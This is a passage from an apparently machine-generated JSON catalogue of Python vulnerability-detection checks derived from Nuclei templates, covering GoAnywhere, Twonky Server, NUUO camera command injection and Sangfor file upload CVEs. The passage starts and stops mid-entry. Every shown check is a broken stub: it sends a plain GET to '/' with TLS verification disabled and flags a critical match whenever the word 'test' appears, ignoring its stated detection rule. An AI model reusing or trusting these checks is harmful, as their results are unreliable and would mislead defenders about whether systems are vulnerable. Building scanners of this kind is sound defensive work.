entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"GoAnywhere - Authentication Bypass\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_10035(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2025",
          "goanywhere",
          "auth-bypass",
          "vkev",
          "kev",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2025_13315",
        "name": "Twonky Server 8.5.2 on Linux and Windows - Log File Exposure",
        "language": "Python",
        "famille": "CVE",
        "description": "Twonky Server 8.5.2 contains a broken access control vulnerability caused by bypassing web service API authentication, letting unauthenticated attackers read log files with administrator credentials, exploit requires no authentication",
        "severity": "critical",
        "detection": "[OR] DSL: status_code == 200; contains_all(body,\"server_main_impl\",\"LOG_SYSTEM:\",\"upnp_ini_file\")",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-13315\nName: Twonky Server 8.5.2 on Linux and Windows - Log File Exposure\nSeverity: critical\nDescription: Twonky Server 8.5.2 contains a broken access control vulnerability caused by bypassing web service API authentication, letting unauthenticated attackers read log files with administrator credentials, exploit requires no authentication\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_13315:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-13315\"\n    SEVERITY = \"critical\"\n    NAME = \"Twonky Server 8.5.2 on Linux and Windows - Log File Exposure\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code == 200; contains_all(body,\"server_main_impl\",\"LOG_SYSTEM:\",\"upnp_ini_file\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Twonky Server 8.5.2 on Linux and Windows - Log File Exposure\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_13315(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-13315\nName: Twonky Server 8.5.2 on Linux and Windows - Log File Exposure\nSeverity: critical\nDescription: Twonky Server 8.5.2 contains a broken access control vulnerability caused by bypassing web service API authentication, letting unauthenticated attackers read log files with administrator credentials, exploit requires no authentication\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_13315:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-13315\"\n    SEVERITY = \"critical\"\n    NAME = \"Twonky Server 8.5.2 on Linux and Windows - Log File Exposure\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code == 200; contains_all(body,\"server_main_impl\",\"LOG_SYSTEM:\",\"upnp_ini_file\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Twonky Server 8.5.2 on Linux and Windows - Log File Exposure\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_13315(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2025",
          "twonky",
          "server",
          "exposure",
          "unauth",
          "vkev"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2025_1338",
        "name": "NUUO Camera <=20250203 - OS Command Injection",
        "language": "Python",
        "famille": "CVE",
        "description": "NUUO Camera up to 20250203 contains a command injection caused by manipulation of the 'log' argument in /handle_config.php, letting remote attackers execute arbitrary commands, exploit requires remote access.",
        "severity": "critical",
        "detection": "[OR] DSL: status_code == 200; contains_all(body, \"/mtd/block4/log/\", \"uid=\", \"gid=\")",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-1338\nName: NUUO Camera <=20250203 - OS Command Injection\nSeverity: critical\nDescription: NUUO Camera up to 20250203 contains a command injection caused by manipulation of the 'log' argument in /handle_config.php, letting remote attackers execute arbitrary commands, exploit requires remote access.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_1338:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-1338\"\n    SEVERITY = \"critical\"\n    NAME = \"NUUO Camera <=20250203 - OS Command Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code == 200; contains_all(body, \"/mtd/block4/log/\", \"uid=\", \"gid=\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"NUUO Camera <=20250203 - OS Command Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_1338(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-1338\nName: NUUO Camera <=20250203 - OS Command Injection\nSeverity: critical\nDescription: NUUO Camera up to 20250203 contains a command injection caused by manipulation of the 'log' argument in /handle_config.php, letting remote attackers execute arbitrary commands, exploit requires remote access.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_1338:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-1338\"\n    SEVERITY = \"critical\"\n    NAME = \"NUUO Camera <=20250203 - OS Command Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code == 200; contains_all(body, \"/mtd/block4/log/\", \"uid=\", \"gid=\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"NUUO Camera <=20250203 - OS Command Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_1338(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [
          "CVE-2025-1338"
        ],
        "tags": [
          "cve",
          "cve2025",
          "nuuo",
          "camera",
          "rce",
          "cmdi",
          "intrusive",
          "vkev"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2025_15503",
        "name": "Sangfor OSM - Arbitrary File Upload",
        "language": "Python",
        "famille": "CVE",
        "description": "Sangfor Operation and Maintenance Management System <= 3.0.8 contains an unrestricted file upload vulnerability caused by manipulation of the \\\"File\\\" argument in /fort/trust/version/common/common.jsp, letting remote attackers upload arbitrary files, exploit requires no special privileges.",
        "severity": "critical",
        "detection": "[OR] DSL: status_code == 200; contains(body, \"Upload success\") / [OR] DSL: status_code == 200; contains(body, md5(to_string(randnum)))",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "rand_str",
            "datatype": "string",
            "required": false,
            "description": "Chaîne aléatoire Nuclei"
          },
          {
            "name": "randnum",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: randnum",
            "default": "{{rand_int(100000000, 999999999)}}"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-15503\nName: Sangfor OSM - Arbitrary File Upload\nSeverity: critical\nDescription: Sangfor Operation and Maintenance Management System <= 3.0.8 contains an unrestricted file upload vulnerability caused by manipulation of the \\\"File\\\" argument in /fort/trust/version/common/common.jsp, letting remote attackers upload arbitrary files, exploit requires no special privileges.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_15503:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-15503\"\n    SEVERITY = \"critical\"\n    NAME = \"Sangfor OSM - Arbitrary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code == 200; contains(body, \"Upload success\") / [OR] DSL: status_code == 200; contains(body, md5(to_string(randnum)))'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on 